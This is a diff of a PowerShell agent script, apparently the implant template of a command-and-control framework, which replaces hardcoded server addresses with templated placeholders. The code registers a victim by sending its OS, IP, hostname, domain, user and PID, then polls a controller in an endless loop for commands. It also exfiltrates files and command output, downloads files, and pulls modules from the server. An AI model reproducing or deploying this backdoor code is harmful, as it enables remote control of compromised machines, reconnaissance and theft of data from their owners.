@@ -64,7 +64,7 @@ $file_content = Get-Content $File -Encoding Byte
 $content = enc -key $key -un $file_content -file 1
 
             $postParams = @{data=":$content`:"}
-            $re=Invoke-WebRequest -Uri http://{ip}:{port}{image}?page=$agent -Method POST -Body $postParams
+            $re=Invoke-WebRequest -Uri {{HTTP}}://{ip}:{port}{image}?page=$agent -Method POST -Body $postParams
 
 
 $final=[System.Convert]::FromBase64String($content)
@@ -90,7 +90,7 @@ return $output
 
 
             $postParams = @{f=$filename;d=$content}
-            $output=Invoke-WebRequest -Uri http://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
+            $output=Invoke-WebRequest -Uri {{HTTP}}://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
             #echo "returned $re.RawContent"
 
 
@@ -103,7 +103,7 @@ function up($filename){
 $filenameenc=enc -key $key -un $filename
 
 
-$re=Invoke-WebRequest -Uri http://192.168.1.8:8888/uddigui?page=$filenameenc -Method GET
+$re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{upload}?page=$filenameenc -Method GET
 
 $data=dec -key $key -enc $re.Content -file 1
 
@@ -117,7 +117,7 @@ echo $data | Set-Content $filename -Encoding Byte
 
             $modulename = enc -key $key -un $module
             $postParams = @{data=$modulename}
-            $re=Invoke-WebRequest -Uri http://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
+            $re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
             #echo "returned $re.RawContent"
             $modulecontent=dec -key $key -enc $re.Content
 
@@ -138,12 +138,12 @@ $agent="$random-img.jpeg"
 $finaldata="data=$os**$IP**$arch**$hostname**$domain**$whoami**$pid"
 $wc3 = new-object net.WebClient
       $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $key=$wc3.UploadString("http://{ip}:{port}{register}?page=$agent",$finaldata)
+      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}?page=$agent",$finaldata)
 $progressPreference = 'silentlyContinue';
 
 $wc3 = New-Object system.Net.WebClient;
 while($true){
-$req = [System.Net.WebRequest]::Create("http://{ip}:{port}{cmd}?page=$agent")
+$req = [System.Net.WebRequest]::Create("{HTTP}://{ip}:{port}{cmd}?page=$agent")
 $resp = $req.GetResponse()
 $reqstream = $resp.GetResponseStream()
 $stream = new-object System.IO.StreamReader $reqstream
@@ -153,7 +153,7 @@ $enc = $stream.ReadToEnd()
 if($enc -eq "REGISTER"){
 $wc3 = new-object net.WebClient
       $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $key=$wc3.UploadString("http://{ip}:{port}{register}?page=$agent",$finaldata)
+      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}?page=$agent",$finaldata)
 $progressPreference = 'silentlyContinue';
 continue
 }
@@ -231,9 +231,9 @@ $redata=enc -key $key -un $output
 
 $postParams = @{data=$redata}
 
-$re=Invoke-WebRequest -Uri http://192.168.1.8:8888/default?page=$agent -Method POST -Body $postParams
+$re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{re}?page=$agent -Method POST -Body $postParams
 
-#$re = $wc3.UploadString("http://{ip}:{port}{re}?page=$agent","data=$redata");
+#$re = $wc3.UploadString("{HTTP}://{ip}:{port}{re}?page=$agent","data=$redata");
 
 }
 }
